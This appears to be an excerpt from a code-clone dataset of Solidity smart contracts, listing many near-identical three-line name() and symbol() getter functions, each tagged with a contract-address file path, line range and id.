</source>
<source file="systems/source-code/0xe928e115184bad954b11c477df5e1fc94f04e45d.sol" startline="52" endline="54" pcid="8420">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x91448BdD0ef6810de6E4a8B3Ba82590ab70D5b95.sol" startline="69" endline="71" pcid="5318">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x4d93ea7ef293ed2ca2d4cc9723f5e2c0c8e09dec.sol" startline="51" endline="53" pcid="2923">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x4D8c3df04Ce9B909c9FBF4347A5a3fFAdf190142.sol" startline="54" endline="56" pcid="2908">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x3dA0eD9Ba67D1EC0CF5fDeE7598B544BD8A1fA38.sol" startline="71" endline="73" pcid="2248">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x39Ac510d21f06A31e1bf897138E441661f1942a8.sol" startline="68" endline="70" pcid="1929">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x983E15495E359Da37330E515D0a4326d502c0356.sol" startline="66" endline="68" pcid="5498">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xa342B0b37B2a6e213c61B1f19b53dFD3dF82ED53.sol" startline="67" endline="69" pcid="5925">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x34273fc3ff3f50Bef36ee6b4E999872aFddC4127.sol" startline="47" endline="49" pcid="1622">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x42549293c0df3d2eb5ef99722aab9b7228f885a3.sol" startline="68" endline="70" pcid="2449">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x527B878E22Db9747eeA5d5d5e6A241BB42634C5E.sol" startline="69" endline="71" pcid="3073">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xef2d4c16063caa3b3202ab447414b7a2aa53ac37.sol" startline="55" endline="57" pcid="8718">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x3D0ff3246C0C91DDF19688A8CAE0b3F9FfFB5090.sol" startline="72" endline="74" pcid="2199">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xCDFcbB5be93d37A33C85ffd7828dDDd332823349.sol" startline="66" endline="68" pcid="7311">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xa6Bbb91fC7029E259F590195C21C57D26F480835.sol" startline="69" endline="71" pcid="6089">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x41074D4fAe6571188B306Ed26636a00E768E7Bb9.sol" startline="126" endline="128" pcid="2382">
    function symbol() public view  returns (string memory) {
        return _symbol;
    }
</source>
<source file="systems/source-code/0xcc87B5c7F81B57BAE653eeb6a51265E305F85c2a.sol" startline="67" endline="69" pcid="7265">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x3505c70Dbf2Cc4ECD84Dd0Bed04f8126c26Ab909.sol" startline="73" endline="75" pcid="1667">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xCBf5E1478f1B77672a2684535D9aE9Fe1A7aBe5e.sol" startline="55" endline="57" pcid="7246">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x8fE05D10B3c7aE008165Db5FA6a472c25E666A7F.sol" startline="53" endline="55" pcid="5263">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xb7844372AB08A7EBA9D3cA79ccDe3F22C990b1E5.sol" startline="70" endline="72" pcid="6670">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x5ad359AaC713929412c9b802175A9f12E5cf9306.sol" startline="67" endline="69" pcid="3456">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xcAE6d8F16193526B9973C93096F0B9B788af999F.sol" startline="55" endline="57" pcid="7230">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x13d0A3A7D4Ca790E93874a93ED664a301291bBEe.sol" startline="51" endline="53" pcid="529">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xBD13AACef22A780AB305c9478a801Ce8752aa7aB.sol" startline="53" endline="55" pcid="6774">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="378" endline="380" pcid="9099">
  function symbol() external view returns (string memory) {
    return _symbol;
  }
</source>
<source file="systems/source-code/0xB1426cE1931Bc2f72fF5eEcFf831679B1fe52c3b.sol" startline="49" endline="51" pcid="6512">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xB9D25De4DC1E03a475f12ca3aAF1aFDC2407ea8e.sol" startline="71" endline="73" pcid="6717">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x408480574c803D05a0244b479c5020a97f546c51.sol" startline="51" endline="53" pcid="2370">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x5f4B753ddeb0Bc2f78D4bE446994BF0C0497D98e.sol" startline="70" endline="72" pcid="3597">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x8d1Ac863255DFA88B9028eC119f12ABC1062b767.sol" startline="67" endline="69" pcid="5171">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x19a99e5BBFAE5fcF744b3C866b40e36aD15CF656.sol" startline="54" endline="56" pcid="800">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x6068BB046aaF234EEa71A9d54Dd77d76D6dF5581.sol" startline="68" endline="70" pcid="3649">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xDe77F59a385B50d78aeB7C646d9dF1E4fD76f1a4.sol" startline="71" endline="73" pcid="7944">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xf1d00aE9Bb8D5369786FD83A0103866071C59cA4.sol" startline="67" endline="69" pcid="8834">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x6bd91799f767b30b1f7aeb1239b3573b2e366b49.sol" startline="51" endline="53" pcid="3952">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x13F986545Be7680E5832C88C3BC68a096B975949.sol" startline="52" endline="54" pcid="544">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x3D0F6fAF8Ed7c849742861D7C9C7F0Bc1E7Fd116.sol" startline="69" endline="71" pcid="2184">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x19f9165689d09F3562419fE8b429735284cc37C0.sol" startline="70" endline="72" pcid="819">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x8Dfec76a1104A22faAD1c7Ba7A90d9508e3eF5a7.sol" startline="66" endline="68" pcid="5201">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x7620F8bE1A98a4F0CE86B9817767dc565C56eDF3.sol" startline="51" endline="53" pcid="4383">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xCE641a63a438f15A3929C0A66b1428448ccfFaae.sol" startline="56" endline="58" pcid="7337">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xBe43ad4F6F0B27228aC7E54974a57470862FC8Bf.sol" startline="71" endline="73" pcid="6793">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xea53c94ea7862c92d0f084d24551fe4f23beb463.sol" startline="66" endline="68" pcid="8484">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x6cEbef0D2a75E294aEdb3641e77F63CF3ebabb8B.sol" startline="50" endline="52" pcid="3982">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x2965DC16e5d7525240AFDac5315214170C1dBe26.sol" startline="51" endline="53" pcid="1255">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xd4738e9EE70F7C409c5704A8243E2Cf75162098f.sol" startline="54" endline="56" pcid="7572">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x80243a2b6dfb564459fec3e729fda998a4b7a979.sol" startline="52" endline="54" pcid="4723">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xb0549cac8a2bf3f5d65e5d7b713f33a9eaca6768.sol" startline="49" endline="51" pcid="6478">
    function symbol() public view returns (string memory) {
        return _NFTSymbol;
    }
</source>
<source file="systems/source-code/0xf1d00aE9Bb8D5369786FD83A0103866071C59cA4.sol" startline="51" endline="53" pcid="8830">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xB34429e7E522e8cDdDC4D4a49E98E073bdfEa29a.sol" startline="63" endline="65" pcid="6553">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x550f95a80e42c5cfBc786C5C47322862e0332528.sol" startline="69" endline="71" pcid="3178">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x1E8203DF1f5488659b9Ff0F39366014Df7d7068D.sol" startline="68" endline="70" pcid="960">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x400ceeaef948d1DfE5fD1F2fa5a431Fb7e11a086.sol" startline="50" endline="52" pcid="2340">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x3aE19CA727e6c9C06dA578fB34113aF9aC0676ee.sol" startline="70" endline="72" pcid="2001">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x3ce7CAfDEB197967161757d8a44e60e9Bf58bC10.sol" startline="68" endline="70" pcid="2169">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x584535e0ce218addde8af49c308F25aAb7033E53.sol" startline="68" endline="70" pcid="3309">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x951f6AC91566cC392D051278A1E921ECF56a9B6F.sol" startline="50" endline="52" pcid="5399">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x5f4B753ddeb0Bc2f78D4bE446994BF0C0497D98e.sol" startline="54" endline="56" pcid="3593">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xd0cD86CA2768C13980fE496ca78bC72Ed8f2bE8B.sol" startline="70" endline="72" pcid="7442">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x5d914a5ad977439fb1b9a25a6cd71ef41da418dc.sol" startline="53" endline="55" pcid="3575">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x6Bf6EE9e148031D538521BB8Ed8658C6Fe12391a.sol" startline="52" endline="54" pcid="3967">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xFc9804E65cC6E47964c809b9f704440DFb8C5eA0.sol" startline="66" endline="68" pcid="9207">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x3fb9d6a99375a51fd64641bd6e1fd6dd310b74e4.sol" startline="61" endline="63" pcid="2300">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x705418103a3623918d0f718465dacbfd4c30df74.sol" startline="31" endline="33" pcid="4115">
    function name() public pure returns (string memory) {
        return _name;
    }
</source>
<source file="systems/source-code/0x31106529aB0136C568C856A9A07dDbBAe8512865.sol" startline="67" endline="69" pcid="1548">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xae68a4d3aED530bDfca9316fB3f757A8cd27a0e4.sol" startline="52" endline="54" pcid="6330">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x5ba66281ec78ee1a83e7a449d1692b0fda7023e2.sol" startline="55" endline="57" pcid="3499">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x48bA2f91830E68c208AE35A166048BD0Bc239dDb.sol" startline="70" endline="72" pcid="2735">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xd1a932685B4e94E152589C0f264a851812f25724.sol" startline="52" endline="54" pcid="7453">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x3c9176ca5edd24a65e938e37729e717a3776ed06.sol" startline="65" endline="67" pcid="2147">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x98dBba70df94bC4057a76E29067b5D5D5676f14c.sol" startline="70" endline="72" pcid="5560">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xbe8784905d6EfEf6935E715Cf2075dF356807306.sol" startline="51" endline="53" pcid="6806">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x4115454c188acFB9Cb67c6d795214055381b53B5.sol" startline="71" endline="73" pcid="2404">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x5C1f1986b0cD5EF29A7528f59DC0dC03060dE44E.sol" startline="63" endline="65" pcid="3529">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x707dAb814AAE29c506EAfc8036b64066FC403444.sol" startline="66" endline="68" pcid="4133">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x08f9862424E2A8F7d7BDcd2c8C33C12d6cFbd43e.sol" startline="68" endline="70" pcid="247">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x408480574c803D05a0244b479c5020a97f546c51.sol" startline="67" endline="69" pcid="2374">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xE29128019902c7B59CEb2A145D7FBFdA58b0ab02.sol" startline="73" endline="75" pcid="8168">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x78102a37f04eb263c1f626702f1c1f98618ea3de.sol" startline="126" endline="128" pcid="4499">
    function symbol() public view  returns (string memory) {
        return _symbol;
    }
</source>
<source file="systems/source-code/0xDc41DbF96D3641d64D46C2a9D805B2a7eA804438.sol" startline="50" endline="52" pcid="7815">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xF0098c03f5544FcC13F8f4DeB183527801B6B40D.sol" startline="53" endline="55" pcid="8793">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x6277c6BC834f6A1cCa9905696a5b6d4f459BC736.sol" startline="54" endline="56" pcid="3755">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xA37D2E1b045B2dB51d475c8344891AB6E868e64D.sol" startline="53" endline="55" pcid="5936">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xC44c92c0226cF68852E3dbD8E5020B654781De95.sol" startline="63" endline="65" pcid="7052">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xa1754e6c03f9e03b36f416a585df4357247c2a83.sol" startline="44" endline="46" pcid="5839">
    function name() public pure returns (string memory) {
        return NAME;
    }
</source>
<source file="systems/source-code/0x4504921b0d800eca1770f89740b7aaa8f3f57fb9.sol" startline="56" endline="58" pcid="2570">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xE78A151431cC384BC2Dee2dBd5115f58b1A63D6c.sol" startline="66" endline="68" pcid="8364">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xa0EeeaeA46e92b35849f6F3afC9C63478A0967A0.sol" startline="53" endline="55" pcid="5779">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xda4900629c8cd26434f99565a2e56e9ffa3fd187.sol" startline="415" endline="417" pcid="7767">
  function symbol() external view returns (string memory) {
    return _symbol;
  }
</source>
<source file="systems/source-code/0xc9e2d2a161445b4602d1908dae1a4ad90e3f1b49.sol" startline="53" endline="55" pcid="7185">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x6d1456049210842b851a60C4ca116179658eF07a.sol" startline="68" endline="70" pcid="4016">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xef2d4c16063caa3b3202ab447414b7a2aa53ac37.sol" startline="71" endline="73" pcid="8722">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x2EE5459A05D2DCF76699D0A383EdAcD6e5A8Ee03.sol" startline="68" endline="70" pcid="1415">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xeE35812e1254Da3Bd81eA1ba4275f2001085d671.sol" startline="50" endline="52" pcid="8688">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x3c36CB64F2255b3558b0056E3c2F5C025E8B7a6d.sol" startline="72" endline="74" pcid="2080">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x46a9D15f23306E44060fb3558CDF051dD9D83FA9.sol" startline="52" endline="54" pcid="2639">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xBD0DC4FC7a2797cA0bD2F0b8c792a8BF8dd96358.sol" startline="53" endline="55" pcid="6759">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xe6306Af140F6eefa1d461Ff04a549D51FF4dd16B.sol" startline="50" endline="52" pcid="8315">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xE8EE7f2c7e487F6Cf4424FE4589a37883986c402.sol" startline="71" endline="73" pcid="8409">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x5B8048664dB0A24b6372Cab5972baE9F40c6012e.sol" startline="51" endline="53" pcid="3467">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xBe43ad4F6F0B27228aC7E54974a57470862FC8Bf.sol" startline="55" endline="57" pcid="6789">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x35539cc6f1f1c0449474fdaaa0939893457163da.sol" startline="68" endline="70" pcid="1784">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x2fE58503d325203E80Ed379cE24a9AB5b5f56aEa.sol" startline="50" endline="52" pcid="1456">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xcfd07da825fbc71855ce35cc5953336b23e27a82.sol" startline="67" endline="69" pcid="7427">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x6FB11C60e84916968b4c70ca80889BD13fbEDA9b.sol" startline="69" endline="71" pcid="4077">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x97599936D137EFDD11Eaa2989F58f5a00BCd2803.sol" startline="49" endline="51" pcid="5479">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xccD47BEeEf5E57708853902581289A950E4E9722.sol" startline="68" endline="70" pcid="7280">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xFc9804E65cC6E47964c809b9f704440DFb8C5eA0.sol" startline="50" endline="52" pcid="9203">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x3063792385BB315E7016f3E4eFb0560b567DB022.sol" startline="70" endline="72" pcid="1489">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xc1143D26004Ec3253eF0aB4500113105164aA789.sol" startline="73" endline="75" pcid="6925">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x2AE6bAa928cFeD647807104d4de73aA779a8f433.sol" startline="68" endline="70" pcid="1279">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xA84aFAFf03113A740F0572E617d5972654F0dA4F.sol" startline="68" endline="70" pcid="6150">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x91448BdD0ef6810de6E4a8B3Ba82590ab70D5b95.sol" startline="53" endline="55" pcid="5314">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xa149cAa78E7BdE7F564162B17fc98D47B70DA95a.sol" startline="67" endline="69" pcid="5830">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x26aC04336C1A7ad637c1ab4578A59ce17E1d9Fd9.sol" startline="52" endline="54" pcid="1217">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xae68a4d3aED530bDfca9316fB3f757A8cd27a0e4.sol" startline="68" endline="70" pcid="6334">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xF0098c03f5544FcC13F8f4DeB183527801B6B40D.sol" startline="69" endline="71" pcid="8797">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x92Fb66bAcacDeB0BFf34538D805521F1019dce1a.sol" startline="49" endline="51" pcid="5329">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xdf2b11D6589a98Cf77e8e91B78cE8f2beB3dcbf5.sol" startline="49" endline="51" pcid="8000">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x8f5b2832b8D440cf00B5Ef5a37d12DC9d96F0839.sol" startline="53" endline="55" pcid="5248">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x4c143f140ee6C2E0c0f6125b3133DC67C9D95856.sol" startline="69" endline="71" pcid="2852">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x42825e496a72B5E3278af637a45B712E49c061A0.sol" startline="55" endline="57" pcid="2460">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x4751AA52a743FFea38c4031e5158AcfA30347f26.sol" startline="65" endline="67" pcid="2688">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x98B84E0f85ECA20c129095886bC9330Cbe32c605.sol" startline="69" endline="71" pcid="5515">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x5b80d34d9b91f7e424d4fb73aba7cf5647ead8fa.sol" startline="54" endline="56" pcid="3482">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xDBc4b8F7D65167C5f44426dbb95Ec8921F629386.sol" startline="51" endline="53" pcid="7785">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x442ab95846d23cb78311e8726f307830163a4502.sol" startline="58" endline="60" pcid="2521">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x33F474718b13546c5A717Ff1Fbd2d8BcaB6Fdd45.sol" startline="52" endline="54" pcid="1592">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xbb23847f2A80451AFEBB0D0b48Ab6164E3bA2349.sol" startline="50" endline="52" pcid="6744">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x65D6C1d6d01CBB5D5f010e89E4eC6f3AFccB2C3a.sol" startline="31" endline="33" pcid="3829">
    function name() public pure returns (string memory) {
        return NAME;
    }
</source>
<source file="systems/source-code/0x22E7f1B1300DBd955C689ac4Da292f938A4AEBFA.sol" startline="68" endline="70" pcid="1050">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x6d019E5B4A50315684EBe38A2d30f95aE1EC35e5.sol" startline="55" endline="57" pcid="3997">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x532b9b8cDdE8fDF33e41bF2aE578fC83D9CF8AC9.sol" startline="54" endline="56" pcid="3084">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x75156ffc59Ed375F98D97dA888f2fe09382640a1.sol" startline="50" endline="52" pcid="4298">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x6bd91799f767b30b1f7aeb1239b3573b2e366b49.sol" startline="67" endline="69" pcid="3956">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x0b84Fa92739e6704EEb6658AfdA59747215B496A.sol" startline="69" endline="71" pcid="307">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xdCfb3170A71BE65d6Ae3d70F7B617fa2B467975f.sol" startline="66" endline="68" pcid="7835">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x892128b76b80C251F79B8F2E2fa300eE7546831A.sol" startline="67" endline="69" pcid="5092">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x084C028E04F9C7aa04b2CeE80edE5DA2Fa3bbaF2.sol" startline="51" endline="53" pcid="208">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x2116bc152192df8a87eb74dc69aa64f6f476f792.sol" startline="53" endline="55" pcid="1001">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x729841D06c8D569c8Dc118d9f6a5c663583d709F.sol" startline="54" endline="56" pcid="4206">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xcAE6d8F16193526B9973C93096F0B9B788af999F.sol" startline="71" endline="73" pcid="7234">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x827f6ADc76821927E8f43ECA46eEC57d4338A421.sol" startline="134" endline="136" pcid="4899">
    function name() public view returns (string memory) {
        return _name;
    }
</source>
<source file="systems/source-code/0xD491aC27192A0adc7a149Ff3df75a93265Ad83eB.sol" startline="54" endline="56" pcid="7587">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x15fD6fad37E54f3B9fFcf3B1c4A817987Bc54EB5.sol" startline="67" endline="69" pcid="664">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x9C4595f9D874E2853bc5E57bB98Ca764cBa684d0.sol" startline="71" endline="73" pcid="5689">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x65D6C1d6d01CBB5D5f010e89E4eC6f3AFccB2C3a.sol" startline="35" endline="37" pcid="3830">
    function symbol() public pure returns (string memory) {
        return SYMBOL;
    }
</source>
<source file="systems/source-code/0x9f956D811170c17aEeA2382b44132520D7A63701.sol" startline="66" endline="68" pcid="5749">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x1f3adE6D938122006C0Dc9fb893d767080123917.sol" startline="47" endline="49" pcid="971">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xb07F1e635FbA15234B11A351Ee03Da67D11111B2.sol" startline="55" endline="57" pcid="6497">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xBeC25691510e9A714648323DC55bEC5199719d52.sol" startline="670" endline="672" pcid="6821">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xff5c2d7Ea91Cb2a88e58E840f24088B5b445834A.sol" startline="70" endline="72" pcid="9346">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x73095365CF296E26D912E095C38FAc6b3fFAD3AF.sol" startline="70" endline="72" pcid="4225">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x879ef12F70c31BfB91b7Fd74f74C71bb132D8e3a.sol" startline="48" endline="50" pcid="5028">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x033B28BE598a95363830624C0601E58AB03e9922.sol" startline="53" endline="55" pcid="121">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x173F3b04bD4d245b0Bea67CcA11c18B062098EaF.sol" startline="69" endline="71" pcid="694">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
